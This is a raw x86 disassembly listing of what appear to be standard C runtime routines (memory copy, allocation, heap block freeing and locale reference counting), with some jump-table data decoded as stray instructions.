  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
